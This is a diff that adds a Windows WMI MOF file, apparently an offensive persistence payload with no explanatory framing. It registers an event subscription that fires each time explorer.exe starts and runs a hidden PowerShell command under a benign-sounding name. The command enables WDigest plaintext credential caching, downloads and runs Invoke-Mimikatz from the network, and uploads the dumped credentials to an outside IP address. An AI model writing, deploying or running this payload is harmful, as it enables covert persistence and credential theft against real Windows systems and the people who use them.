@@ -1,0 +1,26 @@
+#PRAGMA AUTORECOVER
+#pragma namespace("\\\\.\\root\\subscription")
+
+instance of __EventFilter as $EventFilter
+{
+    EventNamespace = "Root\\Cimv2";
+    Name  = "PowerShell Filter";
+    Query = "Select * From __InstanceCreationEvent Within 2" 
+            "Where TargetInstance Isa \"Win32_Process\" "
+            "And Targetinstance.Name = \"explorer.exe\" ";
+    QueryLanguage = "WQL";
+};
+
+instance of CommandLineEventConsumer as $Consumer
+{
+    Name = "Powershell Helper";
+    
+    CommandLineTemplate="cmd /C powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"New-Itemproperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -name UseLogonCredential -Value 1 -PropertyType DWORD -Force; IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’); $MimikatzInfo = invoke-mimikatz; $wc=new-object System.Net.webclient; $wc.UploadString('http://192.168.64.144', $MimikatzInfo)";
+                     
+};
+
+instance of __FilterToConsumerBinding
+{
+    Consumer   = $Consumer;
+    Filter = $EventFilter;
+};
